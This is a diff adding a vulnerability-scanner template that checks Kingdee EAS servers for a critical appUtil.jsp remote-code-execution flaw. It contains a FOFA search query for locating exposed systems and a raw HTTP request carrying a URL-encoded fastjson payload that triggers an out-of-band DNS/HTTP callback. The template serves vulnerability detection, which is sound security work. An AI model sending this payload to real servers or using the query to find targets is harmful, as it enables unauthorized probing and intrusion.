@@ -1,0 +1,28 @@
+id: kingdee-eas-appUtil-rce
+info:
+  name: 金蝶 EAS appUtil.jsp - oob rce
+  author: leadlife
+  severity: critical
+  description: 金蝶 EAS 和金蝶 EAS Cloud 在多个版本中存在文件上传漏洞，未经授权的攻击者可以通过特制的请求包或上传恶意的webshell文件，从而进行远程代码执行，控制服务器。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6EAS%E5%AD%98%E5%9C%A8appUtil.jsp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
+  tags: 2024,kingdee,eas,rce,oob
+
+http:
+  - raw:
+      - |
+        GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22{{interactsh-url}}%22%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
